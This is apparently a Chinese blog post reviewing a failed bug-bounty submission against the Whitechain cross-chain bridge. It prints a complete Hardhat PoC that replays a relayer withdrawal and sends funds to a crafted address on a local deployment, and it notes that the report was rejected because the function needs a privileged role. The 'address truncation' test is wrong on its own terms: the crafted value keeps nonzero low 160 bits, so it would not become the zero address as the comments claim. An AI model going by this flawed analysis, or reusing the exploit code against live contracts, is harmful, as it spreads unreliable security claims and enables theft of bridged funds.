Whitechain 跨链桥漏洞挖掘复盘：从源码分析到 PoC 复现，以及被判定 N/A 的反思

Created2026-10-20|Updated2026-10-20
|Post Views:

教训总结
警惕特权函数：以后看合约，看到 onlyOwner、onlyRole 直接跳过，除非能证明可以绕过权限，否则纯属浪费时间。

关注外部攻击面：找那些不需要任何权限，路人随便调用的公共函数（如 swap、deposit、claim）里的逻辑漏洞。

技术不亏：虽然没拿到赏金，但熟练掌握了 Hardhat 本地部署和 PoC 脚本编写，这波不亏。

最近尝试了 HackenProof 上的 Whitechain 跨链桥项目，总结了两个点。

  1. 发现的代码漏洞
    在审计 Bridge.sol 时，发现两个逻辑缺陷：

提现重放：存款函数 bridgeTokens 有 usedHashes 校验防重放，但提现函数 receiveTokens 完全没有。

地址截断：提现时 bytes32 类型的地址被强制转换 uint160，构造特殊地址会导致资金打入零地址。

![alt text](/images/<白链桥第一次复盘 (1).png>)

  1. 技术验证（PoC）
    为了证明漏洞的真实性，我基于 Hardhat 框架编写了完整的 PoC 攻击脚本（FullExploit.ts）。

在编写过程中，我踩平了合约各种严苛的校验坑。比如：

必须动态获取当前链的 ChainId，否则 registerMapping 会报错。

结构体传参时，普通的 address 必须用 hre.ethers.zeroPadValue 补齐成 32 字节的 bytes32。

原生代币的限额必须使用 ZeroHash。

完整代码如下，建议大家阅读时重点关注 Critical 1 和 Critical 2 的攻击逻辑：

import { expect } from “chai”;
import hre from “hardhat”;

describe(“🔥 Whitechain Bridge Full Exploit”, function () {
let BridgeContract: any;
let MapperContract: any;

let deployer: any;
let emergencyAddress: any;
let multisigAddress: any;
let relayerAddress: any;
let user1: any;
let user2: any;

// 枚举常量定义
const DepositType = { None: 0, Lock: 1, Burn: 2 };
// ⚠️ 注意：很多项目中 Unlock 是 1，Mint 是 2。如果这里报错，把 1 改成 2 试试。
const WithdrawType = { None: 0, Unlock: 1, Mint: 2 };

beforeEach(async function () {
const accounts = await hre.ethers.getSigners();
deployer = accounts[0];
emergencyAddress = accounts[1];
multisigAddress = accounts[2];
relayerAddress = accounts[3];
user1 = accounts[4];
user2 = accounts[5];

// 1. 部署 Mapper
MapperContract = await hre.upgrades.deployProxy(
  await hre.ethers.getContractFactory("contracts/main/modules/mapper/Mapper.sol:Mapper"), 
  [{
    emergencyAddress: emergencyAddress.address,
    multisigAddress: multisigAddress.address
  }], 
  { initializer: 'initialize', kind: 'uups' }
);

// 2. 部署 Bridge
BridgeContract = await hre.upgrades.deployProxy(
  await hre.ethers.getContractFactory("contracts/main/modules/bridge/Bridge.sol:Bridge"), 
  [{
    mapperAddress: await MapperContract.getAddress(),
    emergencyAddress: emergencyAddress.address,
    multisigAddress: multisigAddress.address,
    relayerAddress: relayerAddress.address
  }], 
  { initializer: 'initialize', kind: 'uups' }
);

// 3. 注册映射（核心排雷区）
// 动态获取当前链 ID，防止报 ChainId 不匹配的错误
const network = await hre.ethers.provider.getNetwork();
const currentChainId = network.chainId;

// 使用随机的非零地址，防止报 Bytes must be not equal zero 的错误
const fakeTokenAddress = hre.ethers.zeroPadValue(user1.address, 32);

const mapInfo = {
  originChainId: BigInt(1), 
  targetChainId: currentChainId, 
  depositType: DepositType.None, 
  withdrawType: WithdrawType.Unlock, 
  originTokenAddress: fakeTokenAddress, 
  targetTokenAddress: fakeTokenAddress, 
  useTransfer: false,
  isAllowed: true,
  isCoin: true
};

await MapperContract.connect(multisigAddress).registerMapping(mapInfo);

// 4. 给 Bridge 合约充值 100 ETH 供提现
await deployer.sendTransaction({
  to: await BridgeContract.getAddress(),
  value: hre.ethers.parseEther("100")
});

// 5. 设置每日限额（原生币使用 ZeroHash）
await BridgeContract.connect(multisigAddress).setDailyLimit(
  hre.ethers.ZeroHash, 
  relayerAddress.address,
  1000000n
);

});

it(“Critical 1: 提现重放攻击 (Replay Attack)”, async function () {
// 确保 mapId 为 1
const mapId = 1;
const externalId = hre.ethers.encodeBytes32String(“hack_replay_001”);
const amount = 1000n;

// 根据你项目源码的 ABI，receiveTokens 接收的是数组形式传参
const params = [
    externalId,
    mapId,
    amount,
    hre.ethers.zeroPadValue(user1.address, 32),
    hre.ethers.zeroPadValue(user2.address, 32)
];

console.log("\n🚀 第 1 次正常提现...");
const tx1 = await BridgeContract.connect(relayerAddress).receiveTokens(params);
await tx1.wait();
console.log("✅ 第 1 次提现成功！");

console.log("🔥 第 2 次原封不动重放...");
// 使用完全相同的 params 再次调用
const tx2 = await BridgeContract.connect(relayerAddress).receiveTokens(params);
await tx2.wait();
console.log("💥💥💥 [攻击成功] 重放提现成功！合约未做任何防重放拦截！");

expect(tx2).to.not.be.reverted;

});

it(“Critical 2: 地址截断攻击 (Address Truncation)”, async function () {
const mapId = 1;
const externalId = hre.ethers.encodeBytes32String(“hack_zero_002”);
const amount = 1000n;
// 恶意构造：高位有值，低位全 0，强制转换后会变成零地址
const maliciousToAddress = “0x0000000000000000000000000000000000000000000000000000000100000000”;

const params = [
    externalId,
    mapId,
    amount,
    hre.ethers.zeroPadValue(user1.address, 32),
    maliciousToAddress
];

console.log("\n🕳️ 尝试提现到被截断的零地址...");
const tx = await BridgeContract.connect(relayerAddress).receiveTokens(params);
await tx.wait();
console.log("💥💥💥 [攻击成功] 资金被永久销毁！合约未校验 bytes32 高位！");

expect(tx).to.not.be.reverted;

});
});

  1. 为什么被判了 N/A？
    兴冲冲提交后，审核员判定为 Not Applicable（不适用），并扣了 5 点声望。

原因：提现函数带有 onlyRole(RELAYER_ROLE) 权限锁。在 Web3 赏金规则中，利用特权账号（中继器、管理员）引发的漏洞（或特权账号被黑）属于 Out of Scope。外部路人无法直接触发，故不算有效漏洞。
